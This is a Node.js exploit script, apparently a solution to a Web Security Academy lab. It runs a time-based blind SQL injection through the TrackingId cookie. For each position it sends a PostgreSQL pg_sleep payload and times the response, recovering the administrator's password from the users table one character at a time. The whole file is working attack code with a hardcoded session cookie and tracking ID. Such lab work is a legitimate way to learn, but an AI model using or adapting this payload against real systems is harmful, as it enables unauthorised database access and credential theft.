#!/usr/bin/env node

import process from 'node:process';
import { performance } from 'node:perf_hooks';

// Global Constants...
const mainUrl = 'https://0aaa00810382e4508196393200f6009b.web-security-academy.net/';
const session = 'ogcw2mDQ02F58wcPA4GY4Y10gPRl7R78';
const trackingId = 'WXVedE2twrco6hBo';

process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...\n');
  process.exit(1);
});

const request = async (sqlQuery, retries = 10, delay = 1000) => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
       const start = performance.now();
       const response = await fetch(mainUrl, {
        method: 'GET',
        headers: {
          'Cookie': `TrackingId=${trackingId}${sqlQuery}; session=${session}`,
        },
      });
      const end = performance.now();

      if (!response.ok) {
        throw new Error(`HTTP ${response.status} ${response.statusText}`)
      }

      return (end - start) / 1000;
    } catch (e) {
      if (attempt < retries) {
        await new Promise(res => setTimeout(res, delay));
      } else {
        throw new Error(`[!] Todos los intentos fallaron: ${e.message}`);
      }
    }
  }
}

const main = async () => {
  let length = 20;
  let result = '';
  
  for (let position = 1; position < length + 1; position++) {
    for (let character = 0; character < 128; character++) {
      const query = `' || (select case when ((select ascii(substr(password,${position},1)) from users where username='administrator')='${character}') then pg_sleep(5) else '' end)-- -`;
      const time = await request(query);

      process.stdout.write(`\r[+] Result: ${result} | Position: ${position} - Character: ${character}`);

      if (time > 5) {
        result += String.fromCharCode(character);
        (position === length) && process.stdout.write(`\r[+] Success: ${result}\n`);
        break;
      }
    }
  }
}

(async () => {
  await main();
})();
